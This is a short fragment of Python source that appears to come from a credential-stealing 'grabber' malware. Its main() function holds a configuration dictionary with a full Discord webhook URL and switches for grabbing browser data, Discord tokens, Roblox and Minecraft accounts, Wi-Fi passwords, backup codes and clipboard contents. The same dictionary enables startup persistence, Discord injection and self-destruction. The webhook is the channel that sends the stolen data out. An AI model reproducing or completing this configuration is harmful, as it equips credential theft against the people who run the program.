...
def main():
    __CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1175864400138215484/vK8Y7vlT0PXATCA5-M2AWdUN2MqFdWRk2zlQDieOR1gvhghv8YylqUOdAKZleS9QTYS5', 'ping': True, 'pingtype': 'Everyone', 'fakeerror': False, 'startup': True, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': True, 'clipboard': True}
